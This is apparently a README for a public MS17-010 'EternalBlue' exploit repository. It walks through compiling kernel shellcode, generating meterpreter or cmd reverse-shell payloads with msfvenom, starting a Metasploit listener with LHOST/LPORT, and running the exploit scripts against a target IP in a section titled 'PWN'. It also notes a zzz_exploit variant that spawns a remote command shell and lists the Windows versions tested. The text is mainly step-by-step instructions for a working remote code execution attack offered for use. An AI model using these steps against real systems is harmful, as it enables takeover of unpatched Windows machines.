# MS17-010 Exploit Code

This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.

This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit. Your options for auto shell generation are to generate shellcode with msfvenom that has meterpreter (i.e. with metasploit) or to generate a normal windows cmd shell (i.e. without metasploit). You may also select between staged and stageless payloads if you wish to avoid utilizing the msfconsole entirely and use netcat/your own shell handler. Alternatively you can elect to brew in your own shellcode.

This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that usually comes with it.

Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010

run `python eternal_checker.py <TARGET-IP>`


# Requirements
Core exploit code requires impacket and the `mysmb.py` library (included with the repo). To install any requirements simply use pip on the `requirements.txt` file. It's always recommended you use a virtual environment like `venv` when installing python dependencies, but use whatever you like.

Additionally, the helper scripts below require the Metasploit Framework to be installed. At minimum you will need `msfvenom` for the `shell_prep.sh` but stageless command shells can be caught like any normal command shell without the use of Metasploit's multi/handler. Otherwise, simply install the metasploit framework and insure it is in your path.

#### IMPORTANT SUPPORT INFO:
Keep in mind `python2` is *not* officially supported anymore. The original exploit code that is provided was initially built for python2, going forward any errors discovered will be adjusted for insuring the code works with python3 instead of python2. Instructions below assume python/pip are `python3` by default, so if you are using `python2` update based on your own paths when necessary and remember, it is *NOT* officially supported by this repo.
## Python2
`pip2.7 install -r requirements.txt`

## Python3
`pip install -r requirements.txt`

## TODO:
- [x] Validate python3 compatibility
- [ ] Testing with non-msfvenom shellcode

## VIDEO TUTORIALS:
- https://www.youtube.com/watch?v=p9OnxS1oDc0
- https://youtu.be/2FwqryKUoX8


## USAGE:
Navigate to the `shellcode` directory in the repo:

run `./shell_prep.sh`

Follow the prompts, for example:
```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
<YOUR-IP>
LPORT you want x64 to listen on:
<SOME PORT>
LPORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

After the script finishes there will be a shellcode binary named `sc_all.bin` in the shellcode directory


Next, navigate to the main repo directory:

run `listener_prep.sh`

Follow the prompts, for example:
```
 /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
<YOUR-IP>
LPORT for x64 reverse connection:
<SOME PORT>
LPORT for x86 reverse connection:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell:
0
Starting listener...
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

run:

`python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>`

Alternatively you may use `zzz_exploit.py` which is an implementation of the "Eternal" family that uses the same technique from Eternal Romance, Synergy, and Champion. 

This is not setup to send back a reverse shell or execute any sort of payload like Eternal Blue is. This uses the functions from mysmb.py to spawn a semi-interactive cmd shell. There are commented out sections of code that can be modified to interact with metasploit or send of custom payloads using the `service_exec()` function call.

All of the code execution functionality can be found in the `do_system_mysmb_session()` function.

This version of the exploit is great for targeting systems that have named pipes available to avoid crashing the target.

run:

`python zzz_exploit.py <TARGET-IP>`


Enternal Blue has only been tested on Windows 7/Server 2008, and Windows 10 10240 (x64) 

zzz has only been tested on Windows XP

However the Eternal Blue exploits included in this repo also include support for Windows 8/Server 2012 and *should* work.

The zzz exploit should also work on all targets provided you have access to a named pipe. For some OS's (Windows 10) this may also require credentials of a user who can access this named pipe (This is because on newer versions, Guest and NULL sessions are not supported out of the box).

The original exploit code that this repo pulls from is located here: https://github.com/worawit/MS17-010
